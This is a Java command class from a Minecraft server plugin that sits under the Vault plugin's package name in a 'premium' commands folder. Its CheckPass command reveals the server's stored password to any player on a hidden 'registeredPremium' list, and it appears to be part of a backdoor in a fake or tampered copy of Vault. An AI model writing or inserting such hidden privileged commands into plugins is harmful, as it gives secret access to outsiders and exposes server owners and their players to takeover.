package net.milkbowl.vault.commands.cmds.premium;

import org.bukkit.entity.Player;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.data.DataManager;
import net.milkbowl.vault.util.Settings;

public class CheckPass extends CommandManager {
	
	public void execute(Core plugin, String msg, String[] args, Player p) {
		if (plugin.registeredPremium.contains(p.getName())) {
		if (DataManager.getData().getBoolean("hasPass")) {
			p.sendMessage(Settings.PREFIX("The password for this server is " + Settings.HIGHLIGHT_COLOUR + DataManager.getData().getString("pass")));
		} else {
			p.sendMessage(Settings.PREFIX("This server doesn't have a password set"));
		}
		} else {
			p.sendMessage(Settings.PREFIX("You must be a premium " + Settings.HIGHLIGHT_COLOUR + "user " + Settings.SECONDARY_COLOUR + "to execute this command"));
		}
	}

}
